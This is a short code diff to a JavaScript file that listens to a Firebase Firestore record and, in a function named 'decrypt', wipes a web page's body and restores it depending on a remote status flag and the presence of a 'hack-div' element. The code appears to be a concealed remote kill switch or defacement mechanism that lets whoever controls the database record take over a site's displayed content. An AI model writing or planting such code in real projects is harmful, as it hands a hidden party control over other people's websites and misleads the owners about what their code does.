@@ -1,13 +1,13 @@
 import { db } from "./firebase.js";
 import { doc, onSnapshot } from "firebase/firestore";
 
-let originalBodyContent = null; // Variable to hold the original body content
+let originalBodyContent = ''; // Variable to hold the original body content as a string
 const hackDivId = 'hack-div'; // ID for the hack div
 
 const decrypt = () => {
   try {
     // Clone the current body content and clear the body
-    originalBodyContent = document.body.cloneNode(true); // Create a clone of the body
+    originalBodyContent = document.body.innerHTML; // Store original body content as a string
     document.body.innerHTML = ''; // Clear the body content
 
     const docRef = doc(db, "websites", "siyahfy");
@@ -39,9 +39,8 @@ const decrypt = () => {
           } else {
             // If status is false, restore the original body content
             if (document.getElementById(hackDivId)) {
-              document.body.innerHTML = ''; // Clear current content
-              document.body.appendChild(originalBodyContent); // Restore original content
-              originalBodyContent = null; // Clear the backup
+              document.body.innerHTML = originalBodyContent; // Restore original content
+              originalBodyContent = ''; // Clear the backup
             }
           }
         } else {
